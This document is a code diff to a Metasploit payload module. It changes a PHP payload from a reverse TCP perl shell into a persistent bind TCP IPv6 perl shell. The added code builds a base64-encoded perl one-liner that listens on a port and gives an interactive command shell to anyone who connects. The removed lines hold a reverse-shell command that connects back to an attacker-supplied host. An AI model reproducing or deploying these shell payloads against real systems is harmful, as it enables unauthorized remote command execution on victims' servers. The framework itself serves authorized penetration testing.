@@ -10,27 +10,25 @@
 ##
 
 require 'msf/core'
-require 'msf/core/payload/php'
-require 'msf/core/handler/reverse_tcp'
+require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module Metasploit3
 
 	include Msf::Payload::Single
-	include Msf::Payload::Php
 	include Msf::Sessions::CommandShellOptions
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'PHP Command, Double reverse TCP connection (via perl)',
+			'Name'          => 'PHP Command Shell, Bind TCP (via perl) IPv6',
 			'Version'       => '$Revision$',
-			'Description'   => 'Creates an interactive shell via perl',
-			'Author'        => 'cazz',
+			'Description'   => 'Listen for a connection and spawn a command shell via perl (persistent) over IPv6',
+			'Author'        => ['Samy <samy@samy.pl>', 'cazz'],
 			'License'       => BSD_LICENSE,
 			'Platform'      => 'php',
 			'Arch'          => ARCH_PHP,
-			'Handler'       => Msf::Handler::ReverseTcp,
+			'Handler'       => Msf::Handler::BindTcp,
 			'Session'       => Msf::Sessions::CommandShell,
 			'PayloadType'   => 'cmd',
 			'Payload'       =>
@@ -45,21 +43,19 @@ module Metasploit3
 	# Constructs the payload
 	#
 	def generate
-		buf = "#{php_preamble}"
-		buf += "$c = base64_decode('#{Rex::Text.encode_base64(command_string)}');"
-		buf += "#{php_system_block({:cmd_varname=>"$c"})}"
-		return super + buf
-
+		return super + "system(base64_decode('#{Rex::Text.encode_base64(command_string)}'));"
 	end
 
 	#
 	# Returns the command string to use for execution
 	#
 	def command_string
-		lhost = datastore['LHOST']
-		ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
-		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-		cmd   = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\"#{lhost}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+
+		cmd = "perl -MIO -e '$p=fork();exit,if$p;" +
+			"$c=new IO::Socket::INET6(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept;" +
+			"$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'"
+
+		return cmd
 	end
 
 end
